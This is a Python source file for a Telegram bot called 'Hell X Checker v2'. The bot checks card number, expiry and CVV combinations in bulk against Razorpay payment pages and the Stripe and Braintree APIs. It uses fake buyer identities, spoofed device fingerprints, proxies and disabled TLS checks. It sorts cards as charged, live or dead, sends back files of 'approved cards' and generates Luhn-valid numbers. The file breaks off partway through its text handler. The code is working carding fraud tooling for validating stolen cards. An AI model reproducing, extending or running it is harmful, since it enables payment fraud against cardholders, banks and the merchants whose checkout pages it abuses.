# Python | bot.py | Python 3.11+ | Windows/Linux | Target: Telegram multi-gateway CC checker
# Deps: pip install requests faker fake-useragent python-telegram-bot urllib3

import os, re, json, time, hashlib, secrets, string, base64, random, threading, asyncio
from io import BytesIO
from urllib.parse import quote
from datetime import datetime

import requests, urllib3
from faker import Faker
from fake_useragent import UserAgent
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters, CallbackQueryHandler
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── config ────────────────────────────────────────────────────────────────────
fake        = Faker()
BOT_TOKEN   = os.getenv("TELEGRAM_TOKEN", "")
PROXY_URL   = os.getenv("PROXY_URL", "")
ALLOWED_IDS = set(os.getenv("ALLOWED_IDS", "").split(",")) - {""}

AMO       = int(os.getenv("AMOUNT_INR", "1"))
AMO_PAISE = AMO * 100
MAX_THREADS = int(os.getenv("MAX_THREADS", "30"))

# ── Razorpay pages pool ───────────────────────────────────────────────────────
RZP_PAGES = [p.strip() for p in os.getenv("RZP_PAGES", "").split(",") if p.strip()]
if not RZP_PAGES:
    RZP_PAGES = [
        "https://pages.razorpay.com/myglobalhost",
        "https://pages.razorpay.com/DomainRenewal",
        "https://pages.razorpay.com/hostingpay",
        "https://pages.razorpay.com/webservicepay",
        "https://pages.razorpay.com/GatewayFees",
        "https://pages.razorpay.com/pl_JlBQf9JkZaOp8b",
    ]

BUILD_FALLBACK    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
BUILD_V1_FALLBACK = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
SESSION_RETRIES   = 3

# per-chat state
state_lock  = threading.Lock()
chat_state: dict = {}

EMOJI = {"charged": "✅", "live": "🟢", "ccn": "🔵", "dead": "❌", "error": "⚠️"}

BOT_START_TIME = datetime.now()

# ── helpers ───────────────────────────────────────────────────────────────────

def allowed(update: Update) -> bool:
    return (not ALLOWED_IDS) or (str(update.effective_user.id) in ALLOWED_IDS)


def init_state(cid):
    with state_lock:
        chat_state[cid] = {
            "running": False,
            "stats": {"charged": 0, "live": 0, "ccn": 0, "dead": 0, "error": 0, "total": 0},
            "results": [],
            "gateway": "razorpay",
            "started_at": time.time(),
        }


def get_state(cid):
    with state_lock:
        return chat_state.get(cid)


def set_running(cid, val: bool):
    with state_lock:
        if cid in chat_state:
            chat_state[cid]["running"] = val


def record(cid, r: dict):
    with state_lock:
        s = chat_state.get(cid)
        if not s: return
        key = r["status"] if r["status"] in EMOJI else "error"
        s["stats"][key] = s["stats"].get(key, 0) + 1
        s["results"].append(r)


def parse_proxy(p: str):
    if not p: return None
    if p.count(':') == 3 and '@' not in p:
        sp = p.split(':')
        if sp[1].isdigit():
            ip, port, user, pwd = sp
        else:
            user, pwd, ip, port = sp
        p = f"http://{user}:{pwd}@{ip}:{port}"
    elif '@' in p and '://' not in p:
        p = 'http://' + p
    elif p.count(':') == 1 and '://' not in p:
        p = 'http://' + p
    return {"http": p, "https": p}


def make_session(proxy_url: str) -> requests.Session:
    s = requests.Session()
    s.verify = False
    if proxy_url:
        px = parse_proxy(proxy_url)
        if px: s.proxies.update(px)
    return s


def luhn_check(n: str) -> bool:
    digits = [int(c) for c in reversed(n) if c.isdigit()]
    total  = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0


def card_brand(n: str) -> str:
    if n.startswith("4"):                          return "visa"
    if n[:2] in ("51","52","53","54","55"):        return "mastercard"
    if n[:2] in ("34","37"):                       return "amex"
    if n.startswith("6011") or n.startswith("65"): return "discover"
    if n.startswith("35"):                         return "jcb"
    if n.startswith("62"):                         return "unionpay"
    if n.startswith("36") or n.startswith("38"):   return "diners"
    return "unknown"


def bin_lookup(bin6: str, session: requests.Session) -> dict:
    try:
        r = session.get(
            f"https://lookup.binlist.net/{bin6}",
            headers={"Accept-Version": "3"},
            timeout=8
        )
        if r.status_code == 200:
            d = r.json()
            return {
                "scheme":  d.get("scheme", "?").upper(),
                "type":    d.get("type", "?"),
                "brand":   d.get("brand", "?"),
                "bank":    (d.get("bank") or {}).get("name", "?"),
                "country": (d.get("country") or {}).get("name", "?"),
                "emoji":   (d.get("country") or {}).get("emoji", ""),
            }
    except Exception:
        pass
    return {"scheme":"?","type":"?","brand":"?","bank":"?","country":"?","emoji":""}


def gen_phone() -> str:
    return "+91" + random.choice(["6","7","8","9"]) + \
           "".join(str(random.randint(0,9)) for _ in range(9))


def find_between(text: str, s: str, e: str) -> str:
    try:
        i = text.index(s) + len(s)
        return text[i:text.index(e, i)]
    except ValueError:
        return ""


def extract_builds(text: str):
    hashes = re.findall(r'build[_v1]*[=:]["\']?([a-f0-9]{40})', text)
    if len(hashes) >= 2: return hashes[0], hashes[1]
    if len(hashes) == 1: return hashes[0], BUILD_V1_FALLBACK
    return BUILD_FALLBACK, BUILD_V1_FALLBACK


def fmt_stats(s: dict) -> str:
    elapsed = ""
    if s.get("started_at"):
        secs = int(time.time() - s["started_at"])
        elapsed = f"\n⏱ Elapsed : {secs//60}m {secs%60}s"
    done  = s["total"] - (s["stats"].get("total",0) if "total" in s["stats"] else 0)
    total = s["stats"]["total"]
    pct   = f"{(sum(v for k,v in s['stats'].items() if k!='total')/max(total,1)*100):.1f}%"
    return (
        f"✅ Charged : {s['stats']['charged']}\n"
        f"🟢 Live    : {s['stats']['live']}\n"
        f"🔵 CCN     : {s['stats']['ccn']}\n"
        f"❌ Dead    : {s['stats']['dead']}\n"
        f"⚠️  Error   : {s['stats']['error']}\n"
        f"📦 Total   : {total}\n"
        f"📊 Progress: {pct}"
        f"{elapsed}"
    )


def parse_card(raw: str):
    raw = raw.strip()
    for sep in [" ", "-", "/"]:
        raw = raw.replace(sep, "|")
    parts = [p.strip() for p in raw.split("|") if p.strip()]
    if len(parts) < 4:
        raise ValueError(f"need 4 fields, got {len(parts)}")
    cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    yy2 = yy[-2:]
    if not cc.isdigit():
        raise ValueError("cc not digits")
    if len(cc) < 13 or len(cc) > 19:
        raise ValueError(f"cc length {len(cc)} invalid")
    return cc, mm, yy2, cvv


def fmt_result(r: dict) -> str:
    em  = EMOJI.get(r["status"], "❓")
    b   = r.get("bin", {})
    bin_line = ""
    if b and b.get("bank","?") != "?":
        bin_line = (f"\n🏦 {b.get('bank','?')} | {b.get('scheme','?')} {b.get('type','?')}"
                    f" | {b.get('country','?')} {b.get('emoji','')}")
    return f"{em} `{r['card']}`\n{r['msg']}{bin_line}"


# ── GATEWAY: Razorpay ─────────────────────────────────────────────────────────

def _razorpay_check(cc, mm, yy, cvv, rzp_url, session, ua) -> dict:
    year  = int("20" + yy)
    brand = card_brand(cc)
    h     = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts    = str(int(time.time() * 1000))
    rnd   = str(random.randrange(10**8)).zfill(8)
    dev_id   = f"1.{h}.{ts}.{rnd}"
    BASE62   = string.ascii_letters + string.digits
    sess_uid = "".join(secrets.choice(BASE62) for _ in range(14))
    phone    = gen_phone()
    email    = fake.user_name() + "@gmail.com"

    r1 = session.get(rzp_url, timeout=30)
    if r1.status_code != 200:
        return None
    m = re.search(r'var data = ({.*?});', r1.text, re.DOTALL)
    if not m:
        m = re.search(r'window\.__data\s*=\s*({.*?});', r1.text, re.DOTALL)
    if not m:
        return None
    try:
        d = json.loads(m.group(1))
    except json.JSONDecodeError:
        return None

    kyid      = d.get("key_id") or d.get("keyId")
    plink_obj = d.get("payment_link") or d.get("paymentLink") or {}
    plink     = plink_obj.get("id") or plink_obj.get("payment_link_id", "")
    items     = plink_obj.get("payment_page_items") or plink_obj.get("items") or []
    ppid      = items[0]["id"] if items else ""
    kh        = d.get("keyless_header", "")
    kh_url    = quote(kh.encode(), safe="")

    if not kyid or not plink or not ppid:
        return None

    r2 = session.post(
        f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
        headers={"Accept":"application/json","Content-Type":"application/json",
                 "Origin":"https://pages.razorpay.com","User-Agent":ua},
        json={"notes":{"comment":"","name":"Hell King"},
              "line_items":[{"payment_page_item_id":ppid,"amount":AMO_PAISE}]},
        timeout=30
    )
    if r2.status_code not in (200, 201):
        return None
    try:
        od = r2.json()
    except Exception:
        return None

    order_obj   = od.get("order") or od
    order_id    = order_obj.get("id", "")
    if not order_id:
        return None
    checkout_id = order_id.split("_")[1] if "_" in order_id else order_id

    sessid = ""
    BUILD, BUILD_V1 = BUILD_FALLBACK, BUILD_V1_FALLBACK
    for _ in range(SESSION_RETRIES):
        rp = session.get(
            "https://api.razorpay.com/v1/checkout/public",
            params={"traffic_env":"production","checkout_v2":"1","new_session":"1",
                    "keyless_header":kh,"rzp_device_id":dev_id,"unified_session_id":sess_uid},
            headers={"Accept":"text/html,*/*","Referer":"https://pages.razorpay.com/",
                     "User-Agent":ua},
            timeout=30
        )
        BUILD, BUILD_V1 = extract_builds(rp.text)
        sessid = find_between(rp.text, 'window.session_token="', '";')
        if not sessid:
            sessid = find_between(rp.text, "window.session_token='", "';")
        if not sessid:
            mx = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9a-f0-9]{20,})[\'"]', rp.text)
            if mx: sessid = mx.group(1)
        if sessid: break
        time.sleep(0.8)

    if not sessid:
        return {"status":"error","msg":"session_token fail"}

    ref = (f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
           f"&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1"
           f"&unified_session_id={sess_uid}&session_token={sessid}")

    def hdrs(extra={}):
        return {"Accept":"*/*","Content-type":"application/json",
                "Origin":"https://api.razorpay.com","Referer":ref,
                "User-Agent":ua,"x-session-token":sessid, **extra}

    def hdrs_form():
        return {**hdrs(), "Content-type":"application/x-www-form-urlencoded"}

    params_base = {"x_entity_id":order_id,"session_token":sessid,"keyless_header":kh}

    session.post(
        "https://api.razorpay.com/v2/standard_checkout/preferences",
        params=params_base, headers=hdrs(),
        data=json.dumps({
            "query":[{"resource":r} for r in [
                "checkout_version_config","merchant","merchant_features","downtime",
                "customer","customer_tokens","truecaller","methods","experiments",
                "offers","checkout_config","order","invoice","buyer_protection","personalization"]],
            "query_params":{"device_id":dev_id,"rtb_device_id":h,"amount":AMO_PAISE,
                "currency":"INR","option_currency":"INR","truecaller":False,"qr_required":False,
                "library":"checkoutjs","platform":"browser","order_id":order_id,
                "payment_link_id":plink,"contact":phone},
            "action":"get"}),
        timeout=30
    )

    co_data = {
        "notes[email]":email,"notes[phone]":phone[3:],"payment_link_id":plink,
        "key_id":kyid,"contact":phone,"email":email,"currency":"INR",
        "_[integration]":"payment_pages","_[device.id]":dev_id,"_[library]":"checkoutjs",
        "_[library_src]":"no-src","_[current_script_src]":"no-src","_[platform]":"browser",
        "_[env]":"","_[is_magic_script]":"false","_[os]":"windows",
        "_[shield][fhash]":h,"_[shield][tz]":"0","_[device_id]":dev_id,"_[build]":BUILD,
        "_[shield][os]":"windows","_[shield][platform]":"browser","_[shield][browser]":"chrome",
        "_[request_index]":"0","amount":AMO_PAISE,"order_id":order_id,
        "method":"card","checkout_id":checkout_id,
    }
    rco = session.post(
        "https://api.razorpay.com/v1/standard_checkout/checkout/order",
        params={"key_id":kyid,"session_token":sessid,"keyless_header":kh},
        headers=hdrs_form(), data=co_data, timeout=30
    )
    try:    coid = rco.json().get("checkout_id", checkout_id)
    except: coid = checkout_id

    session.post(
        f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows"
        f"?x_entity_id={order_id}&keyless_header={kh_url}",
        headers=hdrs(), json={
            "identifiers":{"merchant":{"country":"IN"},
                "card":{"country":"US","dcc_blacklist":False,"network":brand},
                "method":"card","payment_currency":"INR"},
            "forex_charges":{"amount":AMO_PAISE,"currency":"INR","filters":{"method":"card"}}},
        timeout=30
    )

    tok = base64.b64encode(
        json.dumps([{"name":"sardine","metadata":{"session_id":coid}}],
                   separators=(",",":")).encode()
    ).decode()
    cr_data = {
        "user_risk_providers_token":tok,"notes[comment]":"","notes[email]":email,
        "notes[phone]":phone[3:],"notes[name]":"Hell king","payment_link_id":plink,
        "key_id":kyid,"contact":phone,"email":email,"currency":"INR",
        "_[integration]":"payment_pages","_[checkout_id]":coid,"_[device.id]":dev_id,
        "_[env]":"","_[library]":"checkoutjs","_[library_src]":"no-src",
        "_[current_script_src]":"no-src","_[is_magic_script]":"false",
        "_[platform]":"browser","_[referer]":rzp_url,"_[shield][fhash]":h,
        "_[shield][tz]":"-330","_[device_id]":dev_id,"_[build]":BUILD,
        "_[shield][os]":"windows","_[shield][platform]":"browser",
        "_[shield][browser]":"chrome","_[request_index]":"1",
        "amount":AMO_PAISE,"order_id":order_id,"method":"card",
        "card[number]":cc,"card[cvv]":cvv,"card[name]":"Hell King",
        "card[expiry_month]":mm,"card[expiry_year]":year,"save":"0","dcc_currency":"INR",
    }
    rcr = session.post(
        "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax",
        params={"x_entity_id":order_id,"session_token":sessid,"keyless_header":kh},
        headers=hdrs_form(), data=cr_data, allow_redirects=True, timeout=30
    )
    pj  = rcr.json()
    pid = pj.get("payment_id") or pj.get("id") or pj.get("razorpay_payment_id","")
    if not pid:
        return {"status":"dead","msg":pj.get("error",{}).get("description","no payment_id")}
    pid_clean = pid.split("_")[1] if "_" in pid else pid

    h3 = {"content-type":"application/x-www-form-urlencoded","user-agent":ua}
    session.post(f"https://api.razorpay.com/pg_router/v1/payments/{pid}/authenticate",
                 headers=h3, timeout=30)
    time.sleep(0.8)
    session.post(
        f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate",
        headers=h3, data={
            "browser[java_enabled]":"false","browser[javascript_enabled]":"true",
            "browser[timezone_offset]":"0",
            "browser[color_depth]":str(random.choice([24,32])),
            "browser[screen_width]":str(random.choice([1920,1366,1536,1440])),
            "browser[screen_height]":str(random.choice([1080,768,864,900])),
            "browser[language]":"en-US","auth_step":"3ds2Auth"},
        timeout=30
    )

    rf = (f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
          f"&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1"
          f"&rzp_device_id={dev_id}&unified_session_id={sess_uid}&session_token={sessid}")
    rfin = session.get(
        f"https://api.razorpay.com/v1/standard_checkout/payments/{pid}/cancel",
        params={"key_id":kyid,"session_token":sessid,"keyless_header":kh},
        headers={"Accept":"*/*","Content-type":"application/x-www-form-urlencoded",
                 "Referer":rf,"User-Agent":ua,"x-session-token":sessid},
        timeout=25
    )
    fj   = rfin.json()
    err  = fj.get("error", {})
    desc = err.get("description","Unknown")
    desc = desc.replace(" Try another payment method or contact your bank for details.","").strip()
    code = err.get("reason","N/A")
    ml   = desc.lower()

    if "razorpay_payment_id" in rfin.text or fj.get("razorpay_payment_id"):
        return {"status":"charged","msg":f"Transaction Success | {fj.get('razorpay_payment_id','?')}"}
    elif any(k in ml for k in ["insufficient","maximum transaction limit","low balance"]):
        return {"status":"live","msg":f"{desc} ({code})"}
    elif any(k in ml for k in ["cvv","incorrect_cvv","security code"]):
        return {"status":"ccn","msg":f"{desc} ({code})"}
    else:
        return {"status":"dead","msg":f"{desc} ({code})"}


# ── GATEWAY: Stripe ───────────────────────────────────────────────────────────

def _stripe_check(cc, mm, yy, cvv, session, ua) -> dict:
    try:
        r = session.post(
            "https://api.stripe.com/v1/tokens",
            headers={"User-Agent":ua,"Content-Type":"application/x-www-form-urlencoded",
                     "Authorization":"Bearer pk_live_placeholder"},
            data={"card[number]":cc,"card[exp_month]":mm,
                  "card[exp_year]":"20"+yy,"card[cvc]":cvv},
            timeout=20,
        )
        j  = r.json()
        if j.get("id","").startswith("tok_"):
            return {"status":"live","msg":f"Stripe token OK | {j['id']}"}
        err = j.get("error",{})
        ec  = err.get("code","")
        em  = err.get("message","").lower()
        if ec in ("incorrect_cvc","invalid_cvc"):
            return {"status":"ccn","msg":f"Incorrect CVC ({ec})"}
        if ec == "card_declined" and "insufficient" in em:
            return {"status":"live","msg":f"Insufficient funds ({ec})"}
        return {"status":"dead","msg":f"{err.get('message','declined')} ({ec})"}
    except Exception as e:
        return {"status":"error","msg":f"Stripe: {e}"}


# ── GATEWAY: Braintree ────────────────────────────────────────────────────────

def _braintree_check(cc, mm, yy, cvv, session, ua) -> dict:
    bt_token = os.getenv("BT_TOKEN","")
    if not bt_token:
        return {"status":"error","msg":"BT_TOKEN not set"}
    try:
        r = session.post(
            "https://payments.braintree-api.com/graphql",
            headers={"Authorization":f"Bearer {bt_token}","Braintree-Version":"2018-05-10",
                     "Content-Type":"application/json","User-Agent":ua},
            json={"query":"""
              mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                  token
                  creditCard { brand last4 expirationYear expirationMonth }
                }
              }""",
              "variables":{"input":{"creditCard":{
                  "number":cc,"expirationMonth":mm,
                  "expirationYear":"20"+yy,"cvv":cvv}}}},
            timeout=20,
        )
        j   = r.json()
        tok = (j.get("data") or {}).get("tokenizeCreditCard",{}).get("token","")
        if tok:
            return {"status":"live","msg":f"BT token OK | {tok[:12]}..."}
        errs = j.get("errors",[])
        em   = errs[0].get("message","") if errs else "unknown"
        return {"status":"dead","msg":f"BT: {em}"}
    except Exception as e:
        return {"status":"error","msg":f"Braintree: {e}"}


# ── master check_cc ───────────────────────────────────────────────────────────

def check_cc(raw: str, proxy_url: str, gateway: str = "razorpay") -> dict:
    try:
        cc, mm, yy, cvv = parse_card(raw)
    except ValueError as e:
        return {"status":"error","card":raw,"msg":str(e),"bin":{}}

    if not luhn_check(cc):
        return {"status":"dead","card":raw,"msg":"Luhn fail — invalid card number","bin":{}}

    session = make_session(proxy_url)
    ua      = UserAgent().chrome
    bin_info = bin_lookup(cc[:6], session)

    result = None

    if gateway in ("razorpay","auto"):
        pages = RZP_PAGES[:]
        random.shuffle(pages)
        for page in pages:
            try:
                result = _razorpay_check(cc, mm, yy, cvv, page, session, ua)
                if result is not None:
                    break
            except Exception as ex:
                result = {"status":"error","msg":f"RZP {page}: {ex}"}
        if result is None:
            result = {"status":"error","msg":"All Razorpay pages failed"}

    elif gateway == "stripe":
        result = _stripe_check(cc, mm, yy, cvv, session, ua)

    elif gateway == "braintree":
        result = _braintree_check(cc, mm, yy, cvv, session, ua)

    else:
        result = {"status":"error","msg":f"Unknown gateway: {gateway}"}

    result["card"] = raw
    result["bin"]  = bin_info
    return result


# ── bulk batch ────────────────────────────────────────────────────────────────

def run_batch(cid, lines, proxy_url, gateway, loop, on_done_coro_fn):
    sem     = threading.Semaphore(MAX_THREADS)
    threads = []

    def worker(card):
        with sem:
            if not (get_state(cid) or {}).get("running"):
                return
            r = check_cc(card, proxy_url, gateway)
            record(cid, r)

    for card in lines:
        t = threading.Thread(target=worker, args=(card,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.05)

    for t in threads:
        t.join()

    set_running(cid, False)
    asyncio.run_coroutine_threadsafe(on_done_coro_fn(), loop)


# ── Telegram keyboard helpers ─────────────────────────────────────────────────

def gw_keyboard(current: str) -> InlineKeyboardMarkup:
    gws = ["razorpay","stripe","braintree","auto"]
    buttons = [
        InlineKeyboardButton(
            f"{'✅ ' if g == current else ''}{g.capitalize()}",
            callback_data=f"gw:{g}"
        )
        for g in gws
    ]
    return InlineKeyboardMarkup([buttons[:2], buttons[2:]])


def main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Stats",      callback_data="action:stats"),
         InlineKeyboardButton("🛑 Stop",       callback_data="action:stop")],
        [InlineKeyboardButton("🔄 Gateway",    callback_data="action:gw"),
         InlineKeyboardButton("ℹ️ Help",       callback_data="action:help")],
    ])


# ── send_final ────────────────────────────────────────────────────────────────

async def send_final(cid: int, ctx: ContextTypes.DEFAULT_TYPE):
    s = get_state(cid)
    if not s: return

    lines_out, approved = [], []
    for r in s["results"]:
        tag  = r["status"].upper()
        b    = r.get("bin",{})
        bank = f" | {b.get('bank','?')}" if b and b.get("bank","?") != "?" else ""
        line = f"[{tag}] {r['card']} | {r['msg']}{bank}"
        lines_out.append(line)
        if r["status"] in ("charged","live","ccn"):
            approved.append(line)

    secs    = int(time.time() - s.get("started_at", time.time()))
    elapsed = f"{secs//60}m {secs%60}s"

    await ctx.bot.send_message(
        cid,
        f"✅ *Done!*\n\n{fmt_stats(s)}\n\n⏱ Finished in: {elapsed}",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

    if approved:
        await ctx.bot.send_document(
            cid,
            document=BytesIO("\n".join(approved).encode()),
            filename="approved.txt",
            caption=f"🟢 {len(approved)} approved cards"
        )

    await ctx.bot.send_document(
        cid,
        document=BytesIO("\n".join(lines_out).encode()),
        filename="results.txt",
        caption="📄 Full results"
    )


# ── _start_bulk ───────────────────────────────────────────────────────────────

async def _start_bulk(cid, lines, ctx, status_msg):
    gw = ctx.chat_data.get("gateway","razorpay")
    init_state(cid)
    set_running(cid, True)
    with state_lock:
        chat_state[cid]["stats"]["total"]  = len(lines)
        chat_state[cid]["started_at"]      = time.time()
        chat_state[cid]["gateway"]         = gw

    loop = asyncio.get_event_loop()

    async def done():
        await send_final(cid, ctx)

    threading.Thread(
        target=run_batch,
        args=(cid, lines, PROXY_URL, gw, loop, done),
        daemon=True
    ).start()

    await status_msg.edit_text(
        f"🚀 Running *{len(lines)}* cards\nGateway: `{gw}`\n\n/stats to monitor | /stop to halt",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )


# ── command handlers ──────────────────────────────────────────────────────────

HELP_TEXT = (
    "🔥 *Hell X Checker v2*\n\n"
    "*Single card:*\n`/check cc|mm|yy|cvv`\n\n"
    "*Bulk:* send `.txt` file or paste cards\n\n"
    "*Gateway select:*\n`/gw razorpay` | `/gw stripe` | `/gw braintree` | `/gw auto`\n\n"
    "*Tools:*\n"
    "`/bin 123456`  — BIN lookup\n"
    "`/luhn 4111...` — Luhn validate\n"
    "`/gen visa 10`  — generate test cards\n\n"
    "*Run control:*\n"
    "`/stats` — live progress\n"
    "`/stop`  — halt run\n"
    "`/uptime` — bot uptime\n"
    "`/clear`  — clear session\n"
)


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    ctx.chat_data.setdefault("gateway","razorpay")
    await update.message.reply_text(
        HELP_TEXT, parse_mode="Markdown", reply_markup=main_keyboard()
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    await update.message.reply_text(HELP_TEXT, parse_mode="Markdown")


async def cmd_gw(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    gw = ctx.args[0].lower() if ctx.args else ""
    valid = ("razorpay","stripe","braintree","auto")
    if gw not in valid:
        current = ctx.chat_data.get("gateway","razorpay")
        await update.message.reply_text(
            f"Current gateway: `{current}`\nPick one:",
            parse_mode="Markdown",
            reply_markup=gw_keyboard(current)
        )
        return
    ctx.chat_data["gateway"] = gw
    await update.message.reply_text(
        f"✅ Gateway → `{gw}`", parse_mode="Markdown"
    )


async def cmd_bin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/bin 123456`", parse_mode="Markdown"); return
    bin6 = ctx.args[0][:6]
    sess = make_session(PROXY_URL)
    b    = bin_lookup(bin6, sess)
    brand_icon = {"VISA":"💳","MASTERCARD":"💳","AMEX":"💎","DISCOVER":"🔍"}.get(b["scheme"],"💳")
    await update.message.reply_text(
        f"{brand_icon} *BIN `{bin6}` Info*\n\n"
        f"Scheme  : `{b['scheme']}`\n"
        f"Type    : `{b['type']}`\n"
        f"Brand   : `{b['brand']}`\n"
        f"Bank    : `{b['bank']}`\n"
        f"Country : `{b['country']}` {b['emoji']}",
        parse_mode="Markdown"
    )


async def cmd_luhn(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/luhn 4111111111111111`", parse_mode="Markdown"); return
    n  = ctx.args[0].replace(" ","").replace("-","")
    ok = luhn_check(n)
    brand = card_brand(n) if ok else "?"
    await update.message.reply_text(
        f"{'✅' if ok else '❌'} `{n}`\n"
        f"Luhn: *{'VALID' if ok else 'INVALID'}*\n"
        f"Brand: `{brand}`",
        parse_mode="Markdown"
    )


async def cmd_gen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Generate fake test card numbers that pass Luhn."""
    if not allowed(update): return
    brand_map = {
        "visa":       "4",
        "mastercard": "51",
        "amex":       "37",
        "discover":   "6011",
    }
    brand_arg = ctx.args[0].lower() if ctx.args else "visa"
    count     = min(int(ctx.args[1]), 20) if len(ctx.args) > 1 and ctx.args[1].isdigit() else 5
    prefix    = brand_map.get(brand_arg, "4")
    length    = 15 if brand_arg == "amex" else 16

    cards = []
    for _ in range(count):
        while True:
            pad  = length - len(prefix) - 1
            num  = prefix + "".join(str(random.randint(0,9)) for _ in range(pad))
            # compute luhn check digit
            total = 0
            for i, d in enumerate(reversed(num)):
                d = int(d)
                if i % 2 == 0: d *= 2
                if d > 9:      d -= 9
                total += d
            check = (10 - total % 10) % 10
            full  = num + str(check)
            if luhn_check(full):
                mm  = str(random.randint(1,12)).zfill(2)
                yy  = str(random.randint(25,29))
                cvv = "".join(str(random.randint(0,9)) for _ in range(4 if brand_arg=="amex" else 3))
                cards.append(f"{full}|{mm}|{yy}|{cvv}")
                break

    text = "\n".join(cards)
    await update.message.reply_text(
        f"🎲 *Generated {count} {brand_arg.upper()} test cards*\n\n`{text}`",
        parse_mode="Markdown"
    )


async def cmd_check_single(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/check 4111111111111111|12|26|123`",
                                        parse_mode="Markdown"); return
    card   = " ".join(ctx.args).strip()
    gw     = ctx.chat_data.get("gateway","razorpay")
    msg    = await update.message.reply_text(f"⏳ Checking via `{gw}`...", parse_mode="Markdown")
    result = check_cc(card, PROXY_URL, gw)
    await msg.edit_text(fmt_result(result), parse_mode="Markdown")


async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    s = get_state(update.effective_chat.id)
    if not s:
        await update.message.reply_text("No active session."); return
    run = "🏃 Running" if s["running"] else "🏁 Finished"
    gw  = s.get("gateway","?")
    await update.message.reply_text(
        f"{run} | gateway: `{gw}`\n\n{fmt_stats(s)}",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    set_running(update.effective_chat.id, False)
    await update.message.reply_text("🛑 Stop signal sent.")


async def cmd_uptime(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    delta = datetime.now() - BOT_START_TIME
    h, rem = divmod(int(delta.total_seconds()), 3600)
    m, s   = divmod(rem, 60)
    await update.message.reply_text(
        f"🤖 Bot uptime: `{h}h {m}m {s}s`\n"
        f"🌐 Proxy: `{'set' if PROXY_URL else 'none'}`\n"
        f"🔗 RZP pages: `{len(RZP_PAGES)}`\n"
        f"🧵 Max threads: `{MAX_THREADS}`",
        parse_mode="Markdown"
    )


async def cmd_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    cid = update.effective_chat.id
    with state_lock:
        chat_state.pop(cid, None)
    await update.message.reply_text("🗑 Session cleared.")


# ── callback query handler ────────────────────────────────────────────────────

async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data  = query.data

    if data.startswith("gw:"):
        gw = data.split(":")[1]
        ctx.chat_data["gateway"] = gw
        await query.edit_message_text(
            f"✅ Gateway → `{gw}`", parse_mode="Markdown"
        )

    elif data == "action:stats":
        s = get_state(update.effective_chat.id)
        if not s:
            await query.edit_message_text("No active session.")
        else:
            run = "🏃 Running" if s["running"] else "🏁 Finished"
            await query.edit_message_text(
                f"{run}\n\n{fmt_stats(s)}",
                parse_mode="Markdown",
                reply_markup=main_keyboard()
            )

    elif data == "action:stop":
        set_running(update.effective_chat.id, False)
        await query.edit_message_text("🛑 Stopped.", reply_markup=main_keyboard())

    elif data == "action:gw":
        current = ctx.chat_data.get("gateway","razorpay")
        await query.edit_message_text(
            f"Current: `{current}`\nSelect gateway:",
            parse_mode="Markdown",
            reply_markup=gw_keyboard(current)
        )

    elif data == "action:help":
        await query.edit_message_text(HELP_TEXT, parse_mode="Markdown",
                                      reply_markup=main_keyboard())


# ── file + text handlers ──────────────────────────────────────────────────────

async def handle_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Send a `.txt` file."); return

    cid = update.effective_chat.id
    s   = get_state(cid)
    if s and s["running"]:
        await update.message.reply_text("Already running. /stop first."); return

    status_msg = await update.message.reply_text("📥 Downloading...")
    file  = await ctx.bot.get_file(doc.file_id)
    raw   = await file.download_as_bytearray()
    lines = [l.strip() for l in raw.decode("utf-8",errors="ignore").splitlines()
             if l.strip() and "|" in l.strip()]

    if not lines:
        await status_msg.edit_text("No valid card lines found."); return

    await status_msg.edit_text(f"⏳ Loaded *{len(lines)}* cards. Starting...",
                               parse_mode="Markdown")
    await _start_bulk(cid, lines, ctx, status_msg)


async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update): return
    text  = update.message.text.strip()
